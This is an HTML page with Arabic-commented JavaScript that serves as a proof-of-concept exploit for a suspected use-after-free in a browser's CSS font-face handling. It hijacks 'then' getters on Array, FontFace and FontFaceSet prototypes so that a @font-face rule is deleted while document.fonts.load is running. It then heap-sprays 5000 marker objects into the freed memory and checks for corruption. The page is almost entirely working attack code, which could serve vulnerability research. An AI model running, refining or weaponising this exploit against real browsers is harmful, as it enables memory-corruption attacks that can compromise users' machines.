<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>UAF Proof via Heap Spray</title>
<style>
@font-face {
    font-family: "uafproof";
    src: local("Arial"), local("Helvetica");
    unicode-range: U+0041;
}
@font-face {
    font-family: "uafproof";
    src: local("Arial"), local("Helvetica");
    unicode-range: U+0042;
}
</style>
</head>
<body>
<h2>UAF Proof via Heap Spray</h2>
<button onclick="runProof()">ابدأ الإثبات</button>
<div id="out" style="font-family: monospace; white-space: pre; background: #000; color: #0f0; padding: 10px; min-height: 500px;"></div>

<script>
let logs = [];
function log(msg) {
    logs.push(msg);
    document.getElementById('out').textContent = logs.join('\n');
    console.log(msg);
}

// أدوات التحويل
const f64 = new Float64Array(1);
const u64 = new BigUint64Array(f64.buffer);

function doubleToHex(d) {
    f64[0] = d;
    return '0x' + u64[0].toString(16);
}

// ========== Heap Spray ==========
function heapSpray(count, marker) {
    log(`  Heap spray: ${count} objects with marker 0x${marker.toString(16)}`);
    const spray = [];
    for (let i = 0; i < count; i++) {
        // إنشاء objects بحجم مشابه لـ CSSFontFace
        const obj = {
            a: marker,
            b: marker + 1,
            c: marker + 2,
            d: new ArrayBuffer(128),
            e: 'A'.repeat(64),
            f: [marker, marker+1, marker+2, marker+3],
        };
        spray.push(obj);
    }
    return spray;
}

// ========== WeakRef Monitor ==========
function monitorObject(obj, name) {
    const weakRef = new WeakRef(obj);
    const registry = new FinalizationRegistry((value) => {
        log(`  🔥 ${name} was GARBAGE COLLECTED!`);
    });
    registry.register(obj, name);
    return weakRef;
}

// ========== Main Proof ==========
async function runProof() {
    logs = [];
    log('=== UAF Proof via Heap Spray ===\n');
    
    // Phase 1: إنشاء الـ style
    const style = document.createElement('style');
    style.textContent = `
@font-face {
    font-family: "uafproof2";
    src: local("Arial"), local("Helvetica");
    unicode-range: U+0041;
}
@font-face {
    font-family: "uafproof2";
    src: local("Arial"), local("Helvetica");
    unicode-range: U+0042;
}`;
    document.head.appendChild(style);
    
    const probe = document.createElement('span');
    probe.textContent = 'AB';
    probe.style.fontFamily = 'uafproof2';
    document.body.appendChild(probe);
    document.body.offsetTop;
    
    log(`Phase 1: cssRules=${style.sheet.cssRules.length}`);
    
    // Phase 2: تثبيت getter مع heap spray
    let fired = false;
    let sprayHolder = null;
    
    const targets = [Array.prototype, FontFace.prototype, FontFaceSet.prototype];
    const saved = targets.map(t => [t, Object.getOwnPropertyDescriptor(t, 'then')]);
    
    function restore() {
        for (const [obj, desc] of saved) {
            if (desc) Object.defineProperty(obj, 'then', desc);
            else delete obj.then;
        }
    }
    
    function handler(where) {
        if (fired) return;
        fired = true;
        log(`\nPhase 2: getter fired via ${where}`);
        
        // حذف الـ rule
        try {
            style.sheet.deleteRule(0);
            log('  ✅ deleteRule(0) executed');
        } catch(e) {
            log(`  ❌ deleteRule failed: ${e.message}`);
        }
        
        // HEAP SPRAY فوراً بعد الحذف!
        // هذا يستبدل الذاكرة المحررة بـ objects نعرفها
        log('  🔄 Starting heap spray...');
        sprayHolder = heapSpray(5000, 0xDEADBEEF);
        log('  ✅ Heap spray complete');
        
        // Force style/layout
        try {
            document.body.offsetTop;
            getComputedStyle(probe).fontFamily;
            log('  ✅ style/layout forced');
        } catch(e) {
            log(`  ❌ style/layout failed: ${e.message}`);
        }
        
        restore();
    }
    
    for (const target of targets) {
        const name = target === Array.prototype ? 'Array.prototype' :
                     target === FontFace.prototype ? 'FontFace.prototype' :
                     'FontFaceSet.prototype';
        Object.defineProperty(target, 'then', {
            configurable: true,
            get() {
                handler(name);
                const savedDesc = saved.find(x => x[0] === target)?.[1];
                return savedDesc && savedDesc.value;
            }
        });
    }
    
    // Phase 3: تشغيل document.fonts.load
    log('\nPhase 3: calling document.fonts.load');
    
    try {
        const faces = await document.fonts.load('16px "uafproof2"', 'AB');
        log(`  document.fonts.load resolved; faces=${faces.length}`);
        
        // Phase 4: فحص الـ faces المرجعة
        log('\nPhase 4: Inspecting returned faces');
        for (let i = 0; i < faces.length; i++) {
            const face = faces[i];
            log(`  Face ${i}:`);
            log(`    family: ${face.family}`);
            log(`    status: ${face.status}`);
            log(`    weight: ${face.weight}`);
            log(`    style: ${face.style}`);
            
            // محاولة قراءة خصائص قد تكشف UAF
            try {
                const str = JSON.stringify({
                    family: face.family,
                    status: face.status,
                    weight: face.weight,
                });
                log(`    JSON: ${str}`);
            } catch(e) {
                log(`    JSON error: ${e.message}`);
            }
        }
        
        // Phase 5: فحص هل الـ spray أثّر
        if (sprayHolder) {
            log('\nPhase 5: Checking spray integrity');
            let corrupted = 0;
            for (let i = 0; i < Math.min(sprayHolder.length, 100); i++) {
                if (sprayHolder[i].a !== 0xDEADBEEF) {
                    corrupted++;
                    log(`  ⚠️ Spray object ${i} corrupted! a=0x${sprayHolder[i].a.toString(16)}`);
                }
            }
            if (corrupted === 0) {
                log('  ✅ Spray objects intact (no cross-corruption)');
            } else {
                log(`  🔥 ${corrupted} spray objects corrupted! UAF CONFIRMED!`);
            }
        }
        
    } catch(e) {
        log(`  ❌ document.fonts.load rejected: ${e.name}: ${e.message}`);
    } finally {
        restore();
    }
    
    // Phase 6: GC pressure + WeakRef check
    log('\nPhase 6: GC pressure test');
    
    // إنشاء ضغط على الـ GC
    const gcPressure = [];
    for (let i = 0; i < 100; i++) {
        gcPressure.push(new ArrayBuffer(1024 * 1024)); // 1MB each
    }
    gcPressure.length = 0; // تحرير
    
    log('  GC pressure applied');
    
    // محاولة ثانية
    try {
        const faces2 = await document.fonts.load('16px "uafproof2"', 'AB');
        log(`  Second load: faces=${faces2.length}`);
    } catch(e) {
        log(`  Second load error: ${e.message}`);
    }
    
    // Cleanup
    style.remove();
    probe.remove();
    sprayHolder = null;
    
    log('\n=== DONE ===');
}
</script>
</body>
</html>
